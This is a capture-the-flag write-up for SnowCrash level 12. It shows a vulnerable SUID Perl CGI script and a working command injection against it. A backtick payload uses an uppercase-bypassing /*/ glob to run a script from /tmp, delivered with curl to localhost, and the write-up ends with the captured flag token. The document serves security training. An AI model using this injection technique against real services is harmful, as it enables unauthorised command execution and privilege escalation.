# Level 12

## Summary

This level demonstrates a command injection vulnerability in a SUID Perl script that runs a web service. The script uses user input directly in a shell command without proper sanitization, allowing execution of arbitrary commands to retrieve the flag.

## Workflow

1. **Analyze the SUID Perl script and understand its functionality.**
    ```
    level12@SnowCrash:~$ ls -l
    total 4
    -rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
    level12@SnowCrash:~$ cat level12.pl 
    #!/usr/bin/env perl
    # localhost:4646
    use CGI qw{param};
    print "Content-type: text/html\n\n";

    sub t {
    $nn = $_[1];
    $xx = $_[0];
    $xx =~ tr/a-z/A-Z/; 
    $xx =~ s/\s.*//;
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    foreach $line (@output) {
        ($f, $s) = split(/:/, $line);
        if($s =~ $nn) {
            return 1;
        }
    }
    return 0;
    }

    sub n {
    if($_[0] == 1) {
        print("..");
    } else {
        print(".");
    }    
    }

    n(t(param("x"), param("y")));
    ```

2. **Create a modified version of the script for testing the vulnerability.**
    ```
    level12@SnowCrash:~$ cat << 'STOP' > /tmp/test.pl
    #!/usr/bin/env perl
    # localhost:4646
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    
    sub t {
    $nn = $_[1];
    $xx = $_[0];
    $xx =~ tr/a-z/A-Z/; 
    $xx =~ s/\s.*//;
    print $xx;
    return 0;
    }
    
    sub n {
    if($_[0] == 1) {
    print("..");
    } else {
    print(".");
    }    
    }
    
    n(t(param("x"), param("y")));
    STOP
    ```

    ```
    level12@SnowCrash:~$ chmod 777 /tmp/test.pl
    ```

3. **Test the script behavior and identify the command injection point.**
    ```
    level12@SnowCrash:~$ /tmp/test.pl x=/tmp/mycommand
    Content-type: text/html

    /TMP/MYCOMMAND.
    
    level12@SnowCrash:~$ /tmp/test.pl x=/tmp/ALREADYCAPS
    Content-type: text/html

    /TMP/ALREADYCAPS.
    
    level12@SnowCrash:~$ /tmp/test.pl x=/*/ALREADYCAPS
    Content-type: text/html

    /*/ALREADYCAPS.
    ```

4. **Prepare the exploit by creating an executable script and testing command injection.**
    ```
    level12@SnowCrash:~$ cat << 'STOP' > /tmp/test.pl
    #!/usr/bin/env perl
    # localhost:4646
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    
    sub t {
    $nn = $_[1];
    $xx = $_[0];
    $xx =~ tr/a-z/A-Z/; 
    $xx =~ s/\s.*//;
    print $xx . "\n";
    `cat $xx`;
    return 0;
    }
    
    sub n {
    if($_[0] == 1) {
    print("..");
    } else {
    print(".");
    }    
    }
    
    n(t(param("x"), param("y")));
    STOP
    ```

    ```
    level12@SnowCrash:~$ chmod 777 /tmp/test.pl
    ```

    ```
    level12@SnowCrash:~$ echo oui > /tmp/IT
    ```

    ```
    level12@SnowCrash:~$ chmod 777 /tmp/IT
    ```

    ```
    level12@SnowCrash:~$ /tmp/test.pl 'x=`/*/IT`'
    Content-type: text/html

    `/*/IT`
    /tmp/IT: 1: /tmp/IT: oui: not found
    ```

5. **Execute the command injection to retrieve the flag.**
    ```
    level12@SnowCrash:~$ echo "getflag > /tmp/token" > /tmp/IT
    level12@SnowCrash:~$ chmod 777 /tmp/IT
    ```

    ```
    level12@SnowCrash:~$ curl 'http://localhost:4646?x=`/*/IT`&y=non'
    Content-type: text/html

    `/*/IT`
    .
    level12@SnowCrash:~$ cat /tmp/token
    Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
    ```